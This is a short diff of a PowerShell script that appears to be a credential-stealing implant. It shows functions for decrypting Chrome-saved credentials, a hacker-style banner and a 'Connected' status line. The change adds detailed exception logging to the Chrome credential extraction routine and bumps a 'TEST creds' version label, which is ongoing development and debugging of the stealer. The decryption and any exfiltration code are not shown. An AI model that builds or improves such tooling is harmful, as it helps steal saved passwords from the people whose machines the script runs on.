@@ -501,7 +501,9 @@ function Get-DecryptedChromeCreds {
         $results | Set-Content -Path $outPath
         return $outPath
     } catch {
-        return "[ERROR] Chrome creds extraction failed: $($_.Exception.Message)"
+    $errorDetails = $_.Exception | Format-List * -Force | Out-String
+    Output-Log "[DEBUG] Exception during Chrome creds extraction:`n$errorDetails"
+    return "[ERROR] Chrome creds extraction failed: $($_.Exception.Message)"
     }
 }
 function Get-Credentials {
@@ -747,7 +749,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 8 +sql
+                                            TEST creds 9 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
